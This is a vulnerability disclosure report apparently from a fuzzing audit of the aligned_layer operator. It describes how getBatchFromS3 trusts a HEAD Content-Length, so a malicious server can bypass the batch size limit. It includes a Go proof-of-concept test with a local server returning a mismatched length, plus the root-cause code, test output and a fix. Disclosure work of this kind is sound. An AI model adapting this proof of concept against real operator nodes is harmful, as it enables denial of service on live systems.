# Bypass length check in `Operator.GetBatchS3`

**Author(s):** Mohammed Benhelli [@Fuzzinglabs](https://github.com/FuzzingLabs/)

**Date:** 01/08/2024

### **Executive summary**

During the process of auditing the code and developing fuzzing harnesses, we found that the `getBatchS3` method
of `Operator` is vulnerable to a bypass length check attack via a crafted HTTP response for example.

### Vulnerability Details

- **Severity:** High
- **Affected Component:** `operator/pkg/s3.go`

## Environment

- **Distro Version:** Ubuntu 22.04.4 LTS
- **Additional Environment Details:** go version go1.22.5 linux/amd64

## Steps to Reproduce

To demonstrate the issue, we provide a Proof of Concept (POC) to show that the bug can be triggered in the `operator`
package.

1. Create a text file in your test folder, here `aligned_layer/fuzzinglabs/operator`:
   ```sh
    echo "That would be rejected" > bypass_length_test.txt
   ```
2. Create a file in your test folder with the following content:
   ```go
   package operator_test
   
   import (
       "github.com/Layr-Labs/eigensdk-go/logging"
       "github.com/ethereum/go-ethereum/common"
       servicemanager "github.com/yetanotherco/aligned_layer/contracts/bindings/AlignedLayerServiceManager"
       "github.com/yetanotherco/aligned_layer/core/config"
       operator "github.com/yetanotherco/aligned_layer/operator/pkg"
       "net/http"
       "os"
       "strconv"
       "strings"
       "testing"
   )
   
   const LimitOperatorBatchSize = 10
   
   func TestGetBatchS3BypassLength(t *testing.T) {
       go startBypassLengthTestServer(t)
       logger, err := config.NewLogger(logging.Production)
       if err != nil {
           t.Fatalf("Error creating logger: %v", err)
       }
       op := operator.Operator{
           Logger: logger,
           Config: config.OperatorConfig{
               Operator: struct {
                   AggregatorServerIpPortAddress string
                   Address                       common.Address
                   EarningsReceiverAddress       common.Address
                   DelegationApproverAddress     common.Address
                   StakerOptOutWindowBlocks      int
                   MetadataUrl                   string
                   RegisterOperatorOnStartup     bool
                   EnableMetrics                 bool
                   MetricsIpPortAddress          string
                   MaxBatchSize                  int64
               }{MaxBatchSize: LimitOperatorBatchSize},
           },
       }
       newBatchLog := &servicemanager.ContractAlignedLayerServiceManagerNewBatch{
           BatchMerkleRoot:  [32]byte([]byte("[\t\t\t\t\t\t\t\t\t\t\t\t\\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t]")),
           BatchDataPointer: "http://localhost:8080",
       }
       if err := op.ProcessNewBatchLog(newBatchLog); err != nil {
           if strings.Contains(err.Error(), "exceeds max batch size") {
               t.Fatal("This test should bypass the length check")
           }
       }
   }
   
   func startBypassLengthTestServer(t *testing.T) {
       http.HandleFunc("/", handleRequestBypassLength)
       t.Fatal(http.ListenAndServe(":8080", nil))
   }
   
   func handleRequestBypassLength(w http.ResponseWriter, r *http.Request) {
       switch r.Method {
       case http.MethodHead:
           w.Header().Set("Content-Length", strconv.Itoa(LimitOperatorBatchSize))
       case http.MethodGet:
           content, err := os.ReadFile("bypass_length_test.txt")
           if err != nil {
               http.Error(w, "File not found", http.StatusNotFound)
               return
           }
           w.Header().Set("Content-Encoding", "txt")
           if _, err := w.Write(content); err != nil {
               return
           }
       default:
           http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
       }
   }
   ```
3. Run the test:
   ```sh
   go test github.com/yetanotherco/aligned_layer/fuzzinglabs/operator
   ```

## Root Cause Analysis

The root cause is located in `operator/pkg/s3.go`.

```go
package operator
...
func (o *Operator) getBatchFromS3(batchURL string, expectedMerkleRoot [32]byte) ([]VerificationData, error) {
	...
	resp, err := http.Head(batchURL)
	if err != nil {
		return nil, err
	}

	// Check if the response is OK
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("error getting Proof Head from S3: %s", resp.Status)
	}

	if resp.ContentLength > o.Config.Operator.MaxBatchSize {
		return nil, fmt.Errorf("proof size %d exceeds max batch size %d",
			resp.ContentLength, o.Config.Operator.MaxBatchSize)
	}
    ...
}
```

Making a `HEAD` request to the batch URL in order to get the content length can be bypassed if the server does not
return the correct content length.

## Detailed Behavior

```sh
=== RUN   TestGetBatchS3BypassLength
{"level":"info","ts":1722606626.9207094,"caller":"pkg/operator.go:177","msg":"Received new batch with proofs to verify","batch merkle root":[91,9,9,9,9,9,9,9,9,9,9,9,9,92,116,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9]}
{"level":"info","ts":1722606626.9207475,"caller":"pkg/s3.go:13","msg":"Getting batch from S3..., batchURL: http://localhost:8080"}
{"level":"info","ts":1722606626.942076,"caller":"pkg/s3.go:46","msg":"Verifying batch merkle tree..."}
{"level":"error","ts":1722606626.9842112,"caller":"pkg/operator.go:183","msg":"Could not get proofs from S3 bucket: merkle root check failed","stacktrace":"github.com/yetanotherco/aligned_layer/operator/pkg.(*Operator).ProcessNewBatchLog\n\t/home/john/FuzzingLabs/aligned_layer/operator/pkg/operator.go:183\ngithub.com/yetanotherco/aligned_layer/fuzzinglabs/operator_test.TestGetBatchS3BypassLength\n\t/home/john/FuzzingLabs/aligned_layer/fuzzinglabs/operator/get_batch_s3_bypass_length_test.go:45\ntesting.tRunner\n\t/home/john/sdk/go1.22.5/src/testing/testing.go:1689"}
--- PASS: TestGetBatchS3BypassLength (0.07s)
PASS
```

## Recommendations

This issue can be fixed by allowing a whitelist of domains that are allowed to host a batch file. This way, the operator
can check if the domain is allowed to host the batch file and if the content length is correct.